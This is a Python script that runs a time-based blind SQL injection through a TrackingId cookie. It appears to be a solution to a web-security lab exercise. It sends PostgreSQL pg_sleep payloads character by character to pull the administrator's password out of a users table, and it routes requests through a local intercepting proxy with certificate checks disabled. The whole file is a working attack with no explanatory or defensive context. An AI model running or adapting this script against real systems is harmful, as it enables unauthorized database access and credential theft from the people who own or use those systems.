import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(40, 126):
            # Construct SQL payload
            sql_payload = f"' || (select case when (username='administrator' and ascii(substring(password,{i},1))={j}) then pg_sleep(10) else pg_sleep(-1) end from users )--" #%(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            
            # Prepare cookies and send request
            cookies = {'TrackingId':'IA0YekAkNzRPDFii'+ sql_payload_encoded, 'session': '8OA0zpyI24fAWBXGYFwUzpcFA46uJVf7'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            # Check response time to determine correct character
            if r.elapsed.total_seconds() > 9:
                #print(chr(j))
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
            	sys.stdout.write('\r' + password_extracted + chr(j))
            	sys.stdout.flush()
    
    print("\nPassword extracted:", password_extracted)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python script.py <url>")
        print("(+) Example: python script.py http://www.example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi....")
    sqli_password(url)

if __name__ == "__main__":
    main()
